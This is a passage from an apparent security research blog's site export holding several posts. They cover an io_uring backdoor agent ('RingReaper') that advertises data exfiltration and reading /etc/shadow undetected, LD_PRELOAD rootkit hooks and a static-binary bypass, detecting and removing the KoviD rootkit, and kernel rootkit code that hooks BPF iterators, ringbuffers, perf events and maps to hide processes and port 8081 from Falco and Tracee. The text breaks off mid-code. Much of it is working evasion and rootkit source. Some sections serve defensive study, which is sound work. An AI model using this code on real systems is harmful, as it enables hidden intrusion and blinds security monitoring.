*ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return 